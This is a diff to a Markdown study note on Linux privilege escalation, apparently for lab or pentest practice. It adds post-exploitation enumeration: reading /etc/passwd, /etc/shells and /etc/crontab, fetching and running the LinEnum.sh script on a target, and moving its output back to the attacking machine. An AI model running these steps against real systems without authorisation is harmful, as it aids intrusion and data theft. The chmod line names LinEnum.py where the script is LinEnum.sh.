@@ -2,9 +2,23 @@
 
 ## Enumeration
 
-### LINENUM  
+### Query the System
+
+Query the hostname: `:> hostname`  
+
+Identify system users: `:> cat /etc/passwd`  
+
+Identify potentially useful shells on the system: `:> cat /etc/shells`
+
+List cron jobs: `:> cat /etc/crontab`
+
+### LinEnum.sh to Exfiltrate the system information
 
 [Get Linenum](!https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)  
+
+Onto the attacking device
+
+`:> wget -O LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh`
 
 Gain access to the target machine
 
@@ -32,7 +46,25 @@ If the target device is permitted a WAN connection, pull the script from GitHub.
 
 `:> wget -O LinEnumFromGit.sh https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh`  
 
+Add execution privileges to the script 
 
+`:> chmod +x LinEnum.py`
+
+![with exeuction](assets/Linux-PrivEsc-01-LinEnum-05.png)  
+
+Run the script and output to a file that can be studied for escalation opportunities
+
+`:> ./LinEnum.sh > enum.txt`
+
+Shutdown the server on the attacking device
+
+![Server Shutdown](assets/Linux-PrivEsc-01-LinEnum-06.png)  
+
+Reverse the server setup and transfer the enum.txt to the attacking device for analysis and resource development.
+
+![Data Exfiltration](assets/Linux-PrivEsc-01-LinEnum-07.png)
+
+### Use FIND to identify useful file properties and attributes  
 
 
 ## SUID/GUID 
